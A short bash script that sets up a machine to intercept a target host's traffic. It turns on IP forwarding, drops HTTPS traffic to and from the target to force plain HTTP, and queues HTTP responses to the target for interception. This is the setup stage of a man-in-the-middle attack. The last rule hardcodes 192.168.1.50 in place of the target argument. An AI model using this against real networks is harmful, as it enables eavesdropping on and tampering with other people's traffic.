#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: os-proxy-setup.sh <TARGET_IP>"
    exit 1
fi

TARGET_IP="$1"

# simple script to forward traffic to the client
sudo sysctl -w net.ipv4.ip_forward=1

# drop 443 packets to strictly proceed on port 80 packets
sudo iptables -A FORWARD -s "$TARGET_IP" -p tcp --dport 443 -j DROP
sudo iptables -A FORWARD -d "$TARGET_IP" -p tcp --sport 443 -j DROP

# intercept TCP traffic coming from Port 80 (HTTP Responses) heading to the target
sudo iptables -A FORWARD -p tcp --sport 80 -d 192.168.1.50 -j NFQUEUE --queue-num 1
